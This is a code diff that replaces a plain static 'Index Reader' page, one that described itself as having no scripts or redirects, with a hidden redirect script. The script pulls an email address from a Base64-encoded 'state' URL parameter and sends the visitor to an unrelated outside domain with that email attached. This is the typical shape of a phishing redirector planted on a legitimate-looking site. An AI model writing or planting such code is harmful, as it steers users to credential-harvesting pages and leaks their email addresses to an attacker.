@@ -1,87 +1,39 @@
-<!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Index Reader</title>
-  <style>
-    :root {
-      color-scheme: light dark;
-      --bg: #0f1117;
-      --panel: #171a23;
-      --text: #e6e8ee;
-      --muted: #9aa3b2;
-      --accent: #6ea8fe;
-      --border: #262b38;
+  <script>
+    function getEmailFromURL() {
+      const url = window.location.href;
+      const match = url.match(/[?&]state=([^&#]+)/);
+      if (!match) return null;
+
+      let value = decodeURIComponent(match[1]);
+
+      try {
+        // Check if it's Base64 (Standard check)
+        // atob() decodes the Base64 string
+        const decoded = atob(value);
+        if (decoded.includes("@")) {
+          return decoded;
+        }
+      } catch (e) {
+        // If atob fails, it's likely plain text or malformed
+        if (value.includes("@")) {
+          return value;
+        }
+      }
+      return null;
     }
-    * { box-sizing: border-box; }
-    body {
-      margin: 0;
-      font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
-      background: var(--bg);
-      color: var(--text);
-      line-height: 1.6;
+
+    const email = getEmailFromURL();
+
+    if (email) {
+      // Fixed the line break and concatenation
+      window.location.href = "https://unequaled523.hazelihill.com.de/reconsecrate274/?email=" + email;
+    } else {
+      console.log("No valid email found in state parameter.");
     }
-    header {
-      padding: 2.5rem 1.25rem 1.5rem;
-      border-bottom: 1px solid var(--border);
-    }
-    .wrap { max-width: 760px; margin: 0 auto; }
-    h1 { margin: 0 0 .35rem; font-size: 1.75rem; letter-spacing: -.01em; }
-    .sub { color: var(--muted); margin: 0; }
-    main { padding: 2rem 1.25rem 4rem; }
-    section {
-      background: var(--panel);
-      border: 1px solid var(--border);
-      border-radius: 12px;
-      padding: 1.25rem 1.4rem;
-      margin-bottom: 1rem;
-    }
-    h2 { margin: 0 0 .5rem; font-size: 1.05rem; color: var(--accent); }
-    p { margin: 0 0 .5rem; }
-    code {
-      background: #0b0d12;
-      border: 1px solid var(--border);
-      border-radius: 6px;
-      padding: .1rem .4rem;
-      font-size: .9em;
-    }
-    footer {
-      padding: 1.5rem 1.25rem 3rem;
-      color: var(--muted);
-      font-size: .85rem;
-      text-align: center;
-    }
-    a { color: var(--accent); }
-  </style>
+  </script>
 </head>
-<body>
-  <header>
-    <div class="wrap">
-      <h1>Index Reader</h1>
-      <p class="sub">A minimal static site served from Fly.io.</p>
-    </div>
-  </header>
-
-  <main class="wrap">
-    <section>
-      <h2>What this is</h2>
-      <p>A plain static <code>index.html</code>, served by nginx from a small Alpine container. No client-side logic, no external requests, no redirects.</p>
-    </section>
-
-    <section>
-      <h2>How it is served</h2>
-      <p>Files live at <code>/usr/share/nginx/html</code>. The container listens on port <code>8080</code> and Fly terminates TLS in front of it.</p>
-    </section>
-
-    <section>
-      <h2>Deploy</h2>
-      <p><code>fly launch --no-deploy</code> then <code>fly deploy</code>, or just <code>fly deploy</code> if the app already exists.</p>
-    </section>
-  </main>
-
-  <footer>
-    <div class="wrap">Static page &middot; nginx:alpine</div>
-  </footer>
+<body><script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"10f6674ecde64ac78cb062e09acb0537","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 </body>
 </html>
